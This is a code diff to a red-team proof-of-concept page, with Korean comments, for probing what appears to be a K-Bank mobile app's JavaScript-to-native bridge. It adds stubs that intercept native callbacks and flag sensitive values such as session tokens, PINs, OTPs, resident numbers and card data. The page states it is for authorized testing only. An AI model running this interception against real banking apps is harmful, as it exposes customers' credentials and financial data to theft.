@@ -7,6 +7,7 @@
 <style>
   body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:14px;background:#0b0b0d;color:#e6e6e6}
   h1{font-size:16px;color:#ff5c5c;margin:0 0 8px}
+  .ver{font-size:12px;color:#7dd3fc;margin:0 0 6px}
   .warn{background:#2a1a1a;border:1px solid #633;padding:9px;border-radius:8px;font-size:12px;margin:6px 0}
   .bar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:10px 0}
   input,select,textarea,button{font:13px -apple-system,system-ui,sans-serif}
@@ -29,6 +30,7 @@
 </head>
 <body>
 <h1>REDTEAM PoC — Bridge Runner</h1>
+<div class="ver">🕒 업데이트(빌드): <b>2026-11-17 14:17:41 KST</b></div>
 <div class="warn">승인된 <b>대상 앱 테스트 전용</b>. 버튼을 누르면 해당 네이티브 인터페이스가 <b>실제 호출</b>됩니다(민감 핸들러는 확인창). 외부 배포·실사용자 대상 금지.</div>
 
 <div class="bar">
@@ -67,6 +69,16 @@ function fmt(a){try{return(a&&typeof a==="object")?JSON.stringify(a):String(a);}
 const SENSV=/custid|cust_id|member|userid|uuid|phone|mobile|ssn|jumin|birth|account|balance|cert|token|signature|sign|clip|session|cookie|pin|passw|bio|otp|motp|mpki|card|regi/i;
 function showResp(name,args){const v=args.map(fmt),j=v.join(" | ");const sens=SENSV.test(name+" "+j);
   L(`[응답] ${name}(${args.length}) = ${j.slice(0,6000)}`+(sens?"  ⚠️ 민감값!":""),sens?"bad":"ok");}
+// ── K-Bank 웹 SDK 전역 스텁 ── 네이티브 콜백이 MobileCmmUtils.<fn>(...) 로 들어옴 → 포착 + ReferenceError 방지
+function mkStub(label){return new Proxy(function(){},{
+  get(t,p){ if(p==='toString'||p==='valueOf'||p===Symbol.toPrimitive)return ()=>'[stub '+label+']';
+    if(p==='then'||typeof p!=='string')return undefined;
+    return mkStub(label+'.'+p);                      // 체인 접근(MobileCmmUtils.a.b)도 스텁
+  },
+  apply(t,thiz,a){ showResp(label, a); return undefined; }   // 호출되면 전체 인자(값) 표시
+});}
+["MobileCmmUtils","MobileCmm","CmmUtils","mobileCmmUtils","Native","NativeBridge","KbankBridge",
+ "smartbank","SmartBank","kbank","Kbank","WebInterface","webInterface"].forEach(n=>{try{window[n]=mkStub(n);}catch(e){}});
 function cbFields(cb){return{callBackId:cb,callBackParam1:"P1",callBackParam2:"P2",callBackParam3:"P3",callBackParam4:"P4",callBackParam5:"P5",callback:cb,callbackId:cb};}
 // 고정 콜백명도 정의(혹시 모를 변형)
 ["nativeCallback","bridgeCallback","callback","kbankCallback","resultCallback","__rt","onResult"].forEach(n=>{try{window[n]=(...a)=>showResp(n,a);}catch(e){}});
